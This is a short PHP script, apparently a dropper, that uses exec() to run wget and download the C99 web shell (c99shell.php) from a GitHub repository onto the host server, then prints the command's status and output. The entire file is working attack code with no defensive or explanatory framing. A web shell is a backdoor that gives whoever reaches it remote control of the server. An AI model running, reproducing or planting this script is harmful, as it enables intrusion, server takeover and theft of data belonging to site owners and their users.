<?php
$output=null;
$retval=null;
exec('wget https://raw.githubusercontent.com/KaizenLouie/C99Shell-PHP7/master/c99shell.php', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>